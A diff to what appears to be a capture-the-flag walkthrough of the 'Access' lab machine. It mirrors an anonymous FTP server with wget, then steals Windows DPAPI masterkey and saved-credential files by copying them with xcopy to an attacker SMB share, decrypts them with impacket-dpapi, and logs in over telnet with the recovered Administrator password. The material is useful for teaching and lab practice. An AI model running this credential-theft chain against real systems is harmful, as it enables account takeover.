@@ -66,14 +66,6 @@ ftp> ls -lha
 08-23-18  09:16PM              5652480 backup.mdb
 226 Transfer complete.
 
-ftp> get backup.mdb
-local: backup.mdb remote: backup.mdb
-200 EPRT command successful.
-125 Data connection already open; Transfer starting.
-100% |***************************************************************|  5520 KiB  523.13 KiB/s    00:00 ETA
-226 Transfer complete.
-5652480 bytes received in 00:10 (523.11 KiB/s)
-
 ftp> cd ..
 250 CWD command successful.
 
@@ -85,14 +77,67 @@ ftp> ls -lha
 125 Data connection already open; Transfer starting.
 08-24-18  01:16AM                10870 Access Control.zip
 226 Transfer complete.
+```
 
-ftp> mget Access\ Control.zip
-mget Access Control.zip [anpqy?]? y
-200 EPRT command successful.
-125 Data connection already open; Transfer starting.
-100% |***************************************************************| 10870       39.52 KiB/s    00:00 ETA
-226 Transfer complete.
-10870 bytes received in 00:00 (39.49 KiB/s)
+```bash
+$ wget -m --no-passive ftp://anonymous:anonymous@$TARGET                                      
+--2024-06-02 17:53:17--  ftp://anonymous:*password*@10.10.10.98/
+           => ‘10.10.10.98/.listing’
+Connecting to 10.10.10.98:21... connected.
+Logging in as anonymous ... Logged in!
+==> SYST ... done.    ==> PWD ... done.
+==> TYPE I ... done.  ==> CWD not needed.
+==> PORT ... done.    ==> LIST ... done.
+
+10.10.10.98/.listing             [ <=>                                           ]      97  --.-KB/s    in 0s      
+
+==> PORT ... done.    ==> LIST ... done.
+
+10.10.10.98/.listing             [ <=>                                           ]      97  --.-KB/s    in 0s      
+
+2024-06-02 17:53:18 (10.2 MB/s) - ‘10.10.10.98/.listing’ saved [194]
+
+--2024-06-02 17:53:18--  ftp://anonymous:*password*@10.10.10.98/Backups/
+           => ‘10.10.10.98/Backups/.listing’
+==> CWD (1) /Backups ... done.
+==> PORT ... done.    ==> LIST ... done.
+
+10.10.10.98/Backups/.listing     [ <=>                                           ]      51  --.-KB/s    in 0s      
+
+2024-06-02 17:53:18 (3.25 MB/s) - ‘10.10.10.98/Backups/.listing’ saved [51]
+
+--2024-06-02 17:53:18--  ftp://anonymous:*password*@10.10.10.98/Backups/backup.mdb
+           => ‘10.10.10.98/Backups/backup.mdb’
+==> CWD not required.
+==> PORT ... done.    ==> RETR backup.mdb ... done.
+Length: 5652480 (5.4M)
+
+10.10.10.98/Backups/backup.m 100%[==============================================>]   5.39M   563KB/s    in 12s     
+
+2024-06-02 17:53:31 (459 KB/s) - ‘10.10.10.98/Backups/backup.mdb’ saved [5652480]
+
+--2024-06-02 17:53:31--  ftp://anonymous:*password*@10.10.10.98/Engineer/
+           => ‘10.10.10.98/Engineer/.listing’
+==> CWD (1) /Engineer ... done.
+==> PORT ... done.    ==> LIST ... done.
+
+10.10.10.98/Engineer/.listin     [ <=>                                           ]      59  --.-KB/s    in 0s      
+
+2024-06-02 17:53:31 (2.87 MB/s) - ‘10.10.10.98/Engineer/.listing’ saved [59]
+
+--2024-06-02 17:53:31--  ftp://anonymous:*password*@10.10.10.98/Engineer/Access%20Control.zip
+           => ‘10.10.10.98/Engineer/Access Control.zip’
+==> CWD not required.
+==> PORT ... done.    ==> RETR Access Control.zip ... done.
+Length: 10870 (11K)
+
+10.10.10.98/Engineer/Access  100%[==============================================>]  10.62K  58.3KB/s    in 0.2s    
+
+2024-06-02 17:53:32 (58.3 KB/s) - ‘10.10.10.98/Engineer/Access Control.zip’ saved [10870]
+
+FINISHED --2024-06-02 17:53:32--
+Total wall clock time: 14s
+Downloaded: 5 files, 5.4M in 12s (453 KB/s)
 ```
 
 ```bash
@@ -374,8 +419,137 @@ whoami
 access\administrator
 ```
 
+### Using dpapi offline - cmdkey
+
 ```bash
+C:\Users\Public\Desktop>cmdkey /list
+
+Currently stored credentials:
+    Target: Domain:interactive=ACCESS\Administrator
+    Type: Domain Password
+    User: ACCESS\Administrator
+```
+
+Getting masterkey
+
+```bash
+dir /s /a:h C:\Users\security\AppData\Local\Microsoft\Protect\
+dir /s /a:h C:\Users\security\AppData\Roaming\Microsoft\Protect\
 ```
 
 ```bash
+C:\temp>dir /s /a:h C:\Users\security\AppData\Local\Microsoft\Protect\
+The system cannot find the file specified.
+
+
+C:\temp>dir /s /a:h C:\Users\security\AppData\Roaming\Microsoft\Protect\
+ Volume in drive C has no label.
+ Volume Serial Number is 8164-DB5F
+ Directory of C:\Users\security\AppData\Roaming\Microsoft\Protect
+08/22/2018  10:18 PM                24 CREDHIST
+               1 File(s)             24 bytes
+ Directory of C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001
+08/22/2018  10:18 PM               468 0792c32e-48a5-4fe3-8b43-d93d64590580
+08/22/2018  10:18 PM                24 Preferred
+               2 File(s)            492 bytes
+     Total Files Listed:
+               3 File(s)            516 bytes
+               0 Dir(s)   3,347,292,160 bytes free
+```
+
+```bash
+C:\temp>xcopy /E /H C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001\* \\10.10.14.3\share
+C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001\0792c32e-48a5-4fe3-8b43-d93d64590580
+C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001\Preferred
+2 File(s) copied
+```
+
+```bash
+$ impacket-dpapi masterkey -file 0792c32e-48a5-4fe3-8b43-d93d64590580 -password 4Cc3ssC0ntr0ller -sid S-1-5-21-953262931-566350628-63446256-1001
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[MASTERKEYFILE]
+Version     :        2 (2)
+Guid        : 0792c32e-48a5-4fe3-8b43-d93d64590580
+Flags       :        5 (5)
+Policy      :        0 (0)
+MasterKeyLen: 000000b0 (176)
+BackupKeyLen: 00000090 (144)
+CredHistLen : 00000014 (20)
+DomainKeyLen: 00000000 (0)
+
+Decrypted key with User Key (SHA1)
+Decrypted key: 0xb360fa5dfea278892070f4d086d47ccf5ae30f7206af0927c33b13957d44f0149a128391c4344a9b7b9c9e2e5351bfaf94a1a715627f27ec9fafb17f9b4af7d2
+```
+
+Masterkey
+
+```bash
+0xb360fa5dfea278892070f4d086d47ccf5ae30f7206af0927c33b13957d44f0149a128391c4344a9b7b9c9e2e5351bfaf94a1a715627f27ec9fafb17f9b4af7d2
+```
+
+Getting saved credential
+
+```bash
+C:\temp>dir /s /a:h C:\Users\security\AppData\Local\Microsoft\Credentials\
+ Volume in drive C has no label.
+ Volume Serial Number is 8164-DB5F
+File Not Found
+
+C:\temp>dir /s /a:h C:\Users\security\AppData\Roaming\Microsoft\Credentials\
+ Volume in drive C has no label.
+ Volume Serial Number is 8164-DB5F
+
+ Directory of C:\Users\security\AppData\Roaming\Microsoft\Credentials
+
+08/22/2018  10:18 PM               538 51AB168BE4BDB3A603DADE4F8CA81290
+               1 File(s)            538 bytes
+
+     Total Files Listed:
+               1 File(s)            538 bytes
+               0 Dir(s)   3,347,292,160 bytes free
+```
+
+```bash
+C:\temp>xcopy /E /H C:\Users\security\AppData\Roaming\Microsoft\Credentials\* \\10.10.14.3\share
+C:\Users\security\AppData\Roaming\Microsoft\Credentials\51AB168BE4BDB3A603DADE4F8CA81290
+1 File(s) copied
+```
+
+```bash
+$ impacket-dpapi credential -file 51AB168BE4BDB3A603DADE4F8CA81290 -key 0xb360fa5dfea278892070f4d086d47ccf5ae30f7206af0927c33b13957d44f0149a128391c4344a9b7b9c9e2e5351bfaf94a1a715627f27ec9fafb17f9b4af7d2
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[CREDENTIAL]
+LastWritten : 2018-08-22 21:18:49
+Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
+Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
+Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
+Target      : Domain:interactive=ACCESS\Administrator
+Description : 
+Unknown     : 
+Username    : ACCESS\Administrator
+Unknown     : 55Acc3ssS3cur1ty@megacorp
+```
+
+| username | password | target |
+|--|--|--|
+| security | 4Cc3ssC0ntr0ller | telnet |
+| Administrator | 55Acc3ssS3cur1ty@megacorp | telnet |
+
+```bash
+$ telnet $TARGET       
+Trying 10.10.10.98...
+Connected to 10.10.10.98.
+Escape character is '^]'.
+Welcome to Microsoft Telnet Service 
+
+login: Administrator
+password: 55Acc3ssS3cur1ty@megacorp
+
+*===============================================================
+Microsoft Telnet Server.
+*===============================================================
+C:\Users\Administrator> whoami
+access\administrator
 ```
